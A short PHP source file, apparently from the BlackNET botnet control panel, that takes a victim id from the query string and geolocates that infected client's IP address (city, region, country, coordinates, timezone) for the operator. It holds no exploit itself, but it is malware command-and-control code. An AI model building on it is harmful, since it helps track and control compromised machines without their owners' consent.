<?php

use GeoIp2\Database\Reader;

$reader = new Reader(APP_PATH . 'GeoLite2-City.mmdb');
$localhost = ['localhost', '127.0.0.1', '::1'];

$client = new BlackNET\Clients($database, $utils);
$ipaddress = $client->getClient($utils->sanitize($_GET['vicid']))->ipaddress;

if (in_array($ipaddress, $localhost)) {
    $client_data = [
        'IP Address' => $ipaddress,
    ];
} else {
    $record = $reader->city($ipaddress);

    $client_data = [
        'IP Address' => $ipaddress,
        'City' => $record->city->name,
        'Region' => $record->mostSpecificSubdivision->name,
        'Country' => $record->country->name,
        'Continent' => $record->continent->name,
        'Latitude' => $record->location->latitude,
        'Longitude' => $record->location->longitude,
        'Timezone' => $record->location->timeZone,
    ];
}
$i = 1;

$page = "getLocationPage";
